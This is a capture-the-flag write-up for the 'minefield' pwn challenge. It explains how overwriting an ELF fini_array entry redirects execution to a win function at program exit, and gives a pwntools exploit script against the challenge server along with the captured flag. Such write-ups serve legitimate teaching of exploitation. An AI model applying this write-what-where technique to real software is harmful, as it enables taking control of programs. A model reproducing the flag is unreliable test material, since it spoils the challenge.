---
title: minefield
date: 2021-04-23
categories: [pwn]
tags: [cyberapocalpyse2021]
toc: false
---

#### Notes:
- This is a short writeup just to note how fini works and how you can overwrite fini_array to execute functions when a program exits normally
- http://beefchunk.com/documentation/sys-programming/binary_formats/elf/elf_from_the_programmers_perspective/node3.html
- The program comes with canary and nx enabled, but the mission() function lets us overwrite a value at an address by using strtoull(buff, nullptr, 0) twice
- There is a win function, so we have to overwrite a value in the fini_array with our win function, so it executes when the program terminates

#### mission():

![Snippet of mission()](/assets/img/cyberapoc/minefield/mission.png)


#### PoC:
```python3
#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template minefield
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('minefield')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
b *0x400c29
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    No RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

#io = start()
io = remote('188.166.145.178', 31295)

io.sendline('2')
# first_write
io.sendline('0x601078')
# second_write
io.sendline('0x40096b')

io.interactive()

#CHTB{d3struct0r5_m1n3f13ld} 
```